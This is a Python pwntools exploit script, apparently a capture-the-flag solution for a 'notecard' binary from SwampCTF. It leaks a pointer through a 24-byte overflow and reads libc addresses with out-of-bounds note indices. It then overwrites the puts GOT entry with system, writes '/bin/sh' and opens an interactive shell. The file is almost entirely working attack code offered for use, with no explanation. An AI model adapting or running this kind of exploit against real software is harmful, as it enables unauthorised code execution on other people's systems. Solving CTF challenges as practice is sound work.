from pwn import *
# Load the binary
binary = ELF("./notecard")
libc = ELF("./libc.so.6")

# Start the process
p = process("./notecard")
#p = remote("chals.swampctf.com", 40002)
#p = gdb.debug("./notecard", "break main\nrun")

# Get addresses from binary and calculate it's offsets
start_addr = binary.symbols['exit_internal']
start_addr = 0x1270
puts_got = binary.got['puts']
printf_got = binary.got['printf']

# Compute offsets
offset_puts = puts_got - start_addr
offset_printf = printf_got - start_addr

payload = b"A" * 24

# Send the payload
p.sendline(payload)

test = p.recvuntil("Change it?")
log.info(f"String: {test[:-11]}")

p.sendline("n")

ptr = p.recvuntil("!")
log.info(f"Full Leak: {ptr}")
log.info(f"Leak ptr len: {len(ptr[38:-1])}")
leak = u64(flat(ptr[38:-1],p16(0)))
log.info(f"Leak: {hex(leak)}")

log.info(f"Found start_addr: {hex(start_addr)}")
log.info(f"Found puts_got: {hex(puts_got)}")
log.info(f"Found printf_got: {hex(printf_got)}")

log.info(f"Calculated puts got: {hex(leak + offset_puts)}")
log.info(f"Calculated printf got: {hex(leak + offset_printf)}")

#Send calculated leaks
p.sendlineafter(">","2")
p.sendlineafter(":","4")
p.sendline(flat("A"*24,p64(leak + offset_printf), p64(leak + offset_puts)))

#Read the value of puts
p.sendlineafter(">","1")
p.sendlineafter(":","-2")
puts_leak = p.recvuntil("0 -")[1:-4]
puts_address = u64(flat(puts_leak, p16(0)))
log.info(f"puts addr: {hex(puts_address)}")

#Read the value of printf
p.sendlineafter(">","1")
p.sendlineafter(":","-3")
printf_leak = p.recvuntil("0 -")[1:-4]
log.info(f"printf leak: {printf_leak}")
printf_address = u64(flat(printf_leak, p16(0)))
log.info(f"printf addr: {hex(printf_address)}")

libc_puts = libc.symbols["puts"]
libc_printf = libc.symbols["printf"]

offset = puts_address - libc_puts
system_address = offset + libc.symbols["system"]

log.info(f"system addr: {hex(system_address)}")

#write /bin/sh somewhere

p.sendlineafter(">","2")
p.sendlineafter(":","1")
#p.sendline(flat(b"/bin/sh", p8(0) * (40 - len(b"/bin/sh"))))
p.sendline(b"/bin/sh")


# overwrite puts got
p.sendlineafter(">","2")
p.sendlineafter(":","-2")
#p.sendline(flat(p64(system_address), p8(0) * (40 - len(p64(system_address)))))
p.sendline(p64(system_address))

p.sendlineafter(">","1")
p.sendlineafter(":","1")

p.interactive()